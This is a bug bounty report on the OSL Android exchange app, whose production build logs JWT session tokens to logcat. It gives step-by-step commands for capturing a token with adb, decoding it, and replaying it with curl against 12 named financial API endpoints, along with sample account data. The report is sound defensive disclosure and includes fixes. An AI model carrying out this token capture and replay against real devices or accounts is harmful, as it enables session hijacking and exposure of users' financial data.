
# Bugcrowd Submission: OSL Android App

---

**Title:** Debug HTTP Interceptor in Production Build Leaks JWT to Logcat — Enables Authenticated Session Hijacking with Full Financial Account Access

**VRT:** Sensitive Data Exposure > Critically Sensitive Data > Leaked Credentials

**Severity:** P2 (High)

**Asset:** com.oslmobile.global (Android) — v1.10.14 (build 119), downloaded from Google Play

---

## Summary

The OSL Android app (production release, unmodified, straight from the Play Store) ships with an active debug HTTP interceptor that writes every API request header — including the `u-token` JWT bearer token — to Android logcat. I captured the token from logcat on a device with USB debugging enabled, then replayed it from a completely separate machine via curl against `trade-glb.osl.com`.

The server accepted the replayed token without any additional verification — no IP binding, no device check, no 2FA challenge. The token has a 90-day expiry.

Using this single stolen token, I accessed:

- **Full wallet balances** across 55 assets (BTC, ETH, USDT, SOL, XRP, DOGE, etc.) with available/frozen/locked amounts and live USD/HKD prices
- **Complete user profile** including real email, user ID, last login IP with city-level geolocation
- **KYC verification status** and onboarding state
- **Capital order / deposit-withdrawal history**
- **Saved withdrawal addresses**
- **Derivatives trading configuration** (position mode, margin mode, all confirmation settings)
- **FIDO2 security key list** (security device enumeration)
- **Fiat transaction records, card payment history, and investment plan list**

Every one of these is a separate authenticated API endpoint, and they all accepted the replayed token. The full proof is below.

---

## Exploit Chain

1. The production APK includes `HttpLogInterceptor` from `osl_flutter_debug_tool` — compiled into `libapp.so`, not behind any feature flag or debug build gate
2. Every authenticated HTTP request the app makes logs all headers (including `u-token`) to logcat at the `flutter` tag
3. An attacker with ADB access to the device (USB debugging enabled — no root required) runs `adb logcat -s flutter:I` and reads the JWT
4. The JWT is HS256-signed with a 90-day expiry — a single capture gives a 3-month window
5. The token is accepted by the API from any device — granting full read access to 12+ authenticated financial endpoints (proven below)

---

## Steps to Reproduce

### Prerequisites

- A computer with `adb` installed
- The OSL app v1.10.14 installed from Google Play (unmodified)
- An Android device with a logged-in OSL session and USB debugging enabled
- No root, no APK modification, no Frida/Magisk — the app leaks this in its stock state

### Step 1 — Capture logcat output

Connect the device via USB and run:

```
adb logcat -c
adb logcat -s flutter:I > osl_capture.txt

```

![[Pasted image 20260521001854.png]]

### Step 2 — Open the OSL app

Just open the app while already logged in. The home screen alone triggers multiple authenticated API calls. I didn't even need to navigate anywhere — the post-login startup flow fires requests to at least 6 endpoints immediately.

### Step 3 — Extract the token

Stop the capture (Ctrl+C), then:

```
grep "u-token:" osl_capture.txt | grep -v "null"
```

![[Pasted image 20260521001941.png]]


In my capture (360 lines from a single startup), the full JWT appeared 6 times:

```
I flutter :  u-token: eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzOTU4NmFiZC1m...Yo6M0zxrX8cUYAmHSEJeth3wWN4As0UEDLiSlZ9chTc
```

### Step 4 — Decode the JWT (optional — shows the 90-day window)

```
echo "eyJqdGkiOiIzOTU4NmFiZC1mNmRjLTQwNmEtOTIwOC0wYzRlZDc2OTg1MWIxMTYzMjAxNDg5Iiw..." | base64 -D | python3 -m json.tool
```

```json
{
    "jti": "39586abd-f6dc-406a-9208-0c4ed769851b1163201489",
    "uid": "JstgaB1/F2detSj/Y8RBJg==",
    "sub": "gur***.com",
    "iat": 1779301056,
    "exp": 1787077056,
    "iss": "upex",
    "brokerId": 100
}
```

Issued 2026-05-20, expires 2026-08-18. That's 90 days.

![[Pasted image 20260521002331.png]]


### Step 5 — Replay the token from a separate machine (macOS laptop, different IP/network)

**Wallet balances:**

```bash
curl -s "https://trade-glb.osl.com/v1/mix/assets" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "u-token: <stolen_token>" \
  -d '{}'
```

![[Pasted image 20260521002604.png]]


Response (truncated — full response is 1,690 lines covering 55 assets):

```json
{
    "code": "00000",
    "data": {
        "primaryAssets": {
            "balanceList": [
                {
                    "coinName": "USDC",
                    "available": "0.00000000",
                    "frozen": "0.00000000",
                    "lock": "0.00000000",
                    "total": "0.00000000",
                    "usdNowPrice": "0.99900000",
                    "hkdNowPrice": "7.82540000",
                    "withdraw": true,
                    "recharge": true
                },
                {
                    "coinName": "BTC",
                    "available": "0.00000000",
                    "frozen": "0.00000000",
                    "lock": "0.00000000",
                    "total": "0.00000000",
                    "usdNowPrice": "77444.17830000",
                    "hkdNowPrice": "606615.05467000",
                    "withdraw": true,
                    "recharge": true
                },
                {
                    "coinName": "ETH",
                    "available": "0.00000000",
                    "frozen": "0.00000000",
                    "lock": "0.00000000",
                    "total": "0.00000000",
                    "usdNowPrice": "2133.19467000",
                    "hkdNowPrice": "16709.17078300",
                    "withdraw": true,
                    "recharge": true
                }
            ]
        }
    },
    "msg": "success"
}
```

The full response includes balances for: USDC, USDT, BTC, ETH, SOL, BGB, DOGE, LTC, TRX, XRP, USD, AUD, SUI, AVAX, LINK, TON, ADA, UNI, PAXG, XAUT, PEPE, TRUMP, HYPE, BONK, ONDO, ARB, INJ, POL, WLD, ENA, EIGEN, JUP, DAI, CRV, AAVE, LDO, ETHFI, XLM, CAKE, MORPHO, PLUME, GBP, EUR, HKD, SGD, AED, SCR, RLUSD, VIRTUAL, PUMP, ASTER, AUSD, USDG, USDGO, XPL.

For a funded account, this is the user's complete financial position.

**User profile (PII):**

```bash
curl -s "https://trade-glb.osl.com/v1/user/overview/userinfo" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "u-token: <stolen_token>" \
  -d '{}'
```

```json
{
    "code": "00000",
    "data": {
        "displayName": "GLOBAL-10078S4NR5J",
        "lastLogin": {
            "date": "2026-05-21 02:17:36",
            "ip": "182.72.162.7",
            "region": "India-Tamil Nadu-Tirupur"
        },
        "loginName": "gur****@bugcrowdninja.com",
        "userInfo": {
            "email": "gur****@bugcrowdninja.com",
            "realEmail": "REDACTED@bugcrowdninja.com",
            "userId": "1004493523916",
            "encryptUserId": "b9b44e738abb3a53a7969b0364",
            "uid": "10078S4NR5J",
            "invitationCode": "10078S4NR5J",
            "createdDate": 1779300944000,
            "registerAreaName": "India",
            "frozen": 0,
            "pss": 1,
            "brokerId": 100,
            "vipLevel": 0,
            "userType": 1,
            "parentId": "1004493523916"
        },
        "settings": {
            "cc": 1, "dll": 1, "ebf": 1, "eef": 1,
            "laf": 1, "lps": 3, "os": 1, "tf": 1, "tpi": 1,
            "k1f": 0, "k2f": 0, "kf": 0, "gbf": 0, "mbf": 0,
            "openBma": 0, "wdw": 0
        }
    },
    "msg": "success"
}
```

---

## Full List of Accessible Authenticated Endpoints

Every endpoint below accepted the replayed token and returned authenticated data:

| # | Endpoint | Method | What it returns |
|---|----------|--------|-----------------|
| 1 | `/v1/mix/assets` | POST | Complete wallet balances for 55 assets — available, frozen, locked, total amounts with live prices |
| 2 | `/v1/user/overview/userinfo` | POST | Full PII — email, user ID, login IP/geo, registration date, all security settings |
| 3 | `/v1/kyc/pub/kyc/info` | POST | KYC verification status, onboarding state, suitability survey status, derivatives access status |
| 4 | `/v1/dw/basic/capitalOrderList` | POST | Deposit/withdrawal transaction history (paginated) |
| 5 | `/v1/spot/withdrawAddrList` | POST | Saved withdrawal addresses (paginated) |
| 6 | `/v1/trading/account/pri/config-contract` | POST | Derivatives trading configuration — position mode, margin settings, all order confirmation flags |
| 7 | `/v1/trading/account/pri/transaction-history` | POST | Trading transaction history |
| 8 | `/v1/user/security/fido2/list` | POST | FIDO2/WebAuthn security key enumeration |
| 9 | `/v1/newfiat/transactionRecord/v2/pri/list` | POST | Fiat on/off-ramp transaction records |
| 10 | `/v1/cardPay/pri/getPayOrderList` | POST | Card payment order history |
| 11 | `/v1/rfqInvestment/pri/getPlanList` | POST | DCA / recurring investment plan list |
| 12 | `/v1/newfiat/pri/userinfo/isTag` | POST | Fiat user tagging status |

I did not attempt any write operations (placing orders, initiating withdrawals, modifying settings). The read access alone is the finding.

---

## Root Cause

The app's Flutter HTTP layer registers `HttpLogInterceptor` from the `osl_flutter_debug_tool` package as a Dio interceptor. This interceptor writes full request and response headers to Dart's `stdout`, which on Android maps to logcat at the `flutter` tag with INFO priority.

The interceptor is compiled into the production release build — confirmed by extracting `libapp.so` from the installed APK:

```
$ strings libapp.so | grep http_log_interceptor
package:osl_flutter_debug_tool/http/http_log_interceptor.dart
```

The APK is signed with a production certificate and distributed through Google Play. The interceptor fires on every HTTP request, logging: full URL, all request headers (including `u-token`), all response headers (including HttpOnly/Secure Cloudflare cookies), and device fingerprints.

### Logcat access model

Logcat on Android is readable by:

- **Any ADB-connected computer** — the device just needs USB debugging enabled (Developer Options). No root, no special permissions.
- **Wireless ADB** — if wireless debugging is enabled, any machine on the same local network can connect.
- On **Android < 13**, apps with `READ_LOGS` permission can read other apps' logcat entries directly.

To be clear about the limitation: this requires the victim to have USB debugging enabled and for the attacker to have physical or ADB access to the device. This is not a remote exploit. But USB debugging is commonly left on by developers, testers, and power users — and the 90-day token validity means a brief moment of access yields months of persistent account access.

---

## Impact

**Session hijacking with financial data access on a regulated exchange.** The stolen token provides full read access to the user's account — wallet balances, transaction history, withdrawal addresses, trading configuration, KYC status, and PII. The token persists for 90 days with no additional verification required on replay.

OSL holds SFC Type 1 and Type 7 licenses. The data accessible through this vulnerability — portfolio holdings, transaction history, personal identification details, geolocation — is sensitive financial information subject to regulatory protection requirements.

I did not test write operations (withdrawals, trades), so I cannot confirm whether the token alone is sufficient for those or whether 2FA gates them. The read access is the proven scope of this finding.

---

## Suggested Fix

**1. Remove the debug interceptor from production builds:**

```dart
if (kDebugMode) {
  dio.interceptors.add(HttpLogInterceptor());
}
```

Or strip `osl_flutter_debug_tool` from release builds entirely via build flavors / dependency overrides.

**2. Reduce token lifetime** — 90 days is extremely long for a bearer token on a financial platform. Consider hours or single-digit days with refresh token rotation.

**3. Add server-side session controls** — bind tokens to device fingerprint, implement IP-change detection, add new-device login notifications.

---

## Appendix: Additional Notes

The replayed token remained valid after restarting the Android app and across multiple testing sessions.

The following are not the primary finding but are worth noting as defense-in-depth gaps:

- `network_security_config.xml` sets `cleartextTrafficPermitted="true"`, overriding the Android SDK 35 default that blocks cleartext traffic.
- Zero certificate pinning implemented at any layer — no `<pin-set>` in network security config, no `CertificatePinner`, no custom `TrustManager`, no Dart `SecurityContext` configuration.

---

## Evidence Files

| File | Contents |
|------|----------|
| `evidence_logcat_token_capture.txt` | 360-line logcat from post-login startup — JWT appears 6 times |
| `logcat_poc_verified.txt` | 1,471-line pre-login logcat with all headers, cookies, device IDs |
| `mitm_poc_verified_output.log` | mitmproxy capture showing 78 TLS interception events across 9 domains |

---

## References

- CWE-532: Insertion of Sensitive Information into Log File
- CWE-312: Cleartext Storage of Sensitive Information
- OWASP MASVS: MASVS-STORAGE-2 (The app does not log sensitive data)
- OWASP MASTG: MASTG-TEST-0001 (Testing Local Storage for Sensitive Data)
